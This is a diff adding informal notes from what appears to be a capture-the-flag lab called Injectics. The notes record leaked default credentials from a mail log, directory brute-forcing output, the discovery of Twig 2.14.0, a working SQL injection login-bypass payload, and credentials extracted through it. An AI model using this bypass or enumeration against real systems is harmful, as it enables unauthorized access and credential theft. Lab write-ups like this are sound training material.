@@ -1,0 +1,72 @@
+FINDING IN THE SOURCE CODE::
+<!-- Website developed by John Tim - dev@injectics.thm-->
+<!-- Mails are stored in mail.log file-->
+
+/mail.log
+
+From: dev@injectics.thm
+To: superadmin@injectics.thm
+
+To add an extra layer of safety, I have configured the service to automatically insert default credentials into the `users` table if it is ever deleted or becomes corrupted. This ensures that we always have a way to access the system and perform necessary maintenance. I have scheduled the service to run every minute.
+
+Here are the default credentials that will be added:
+
+| Email                     | Password 	              |
+|---------------------------|-------------------------|
+| superadmin@injectics.thm  | superSecurePasswd101    |
+| dev@injectics.thm         | devPasswd123            |
+
+
+# Directory bruteforcing:
+/composer.json                                    
+/composer.lock
+/js
+/flags 
+/mail.log
+/phpmyadmin/doc/html/index.html
+/phpmyadmin/index.php
+/vendor/composer/ClassLoader.php
+/vendor/composer/autoload_classmap.php
+/vendor/composer/autoload_files.php               
+[19:15:19] 200 -    0B  - /vendor/composer/autoload_namespaces.php
+[19:15:19] 200 -    0B  - /vendor/autoload.php                              
+[19:15:19] 200 -    0B  - /vendor/composer/autoload_psr4.php
+[19:15:19] 200 -    1KB - /vendor/composer/LICENSE
+[19:15:19] 200 -    0B  - /vendor/composer/autoload_real.php                
+[19:15:19] 403 -  274B  - /vendor/
+[19:15:19] 200 -   12KB - /vendor/composer/installed.json                   
+[19:15:19] 200 -    0B  - /vendor/composer/autoload_static.php  
+********************************************************************************************************************************
+FINDS:::
+http://10.10.54.225/composer.lock
+ "authors": [
+                {
+                    "name": "Fabien Potencier",
+                    "email": "fabien@symfony.com",
+                    "homepage": "http://fabien.potencier.org",
+                    "role": "Lead Developer"
+                },
+                {
+                    "name": "Twig Team",
+                    "role": "Contributors"
+                },
+                {
+                    "name": "Armin Ronacher",
+                    "email": "armin.ronacher@active-4.com",
+                    "role": "Project Founder"
+                }
+            ],
+			#################################################
+			http://10.10.54.225/composer.json
+			twig/twig	"2.14.0"
+			********************************************************************************************
+
+Twig is the most famous language used for the server side template injection attacks:
+
+The following payload worked in the injectis::
+
+username=a ' ||1=1;-- -&password=admin&function=login
+
+From the sql injection in the table::
+dev@injectics.thm:   2342sdsfwf2wr2rf,
+superadmin@injectics.thm:   34234vsdfwr2r2wf2r2
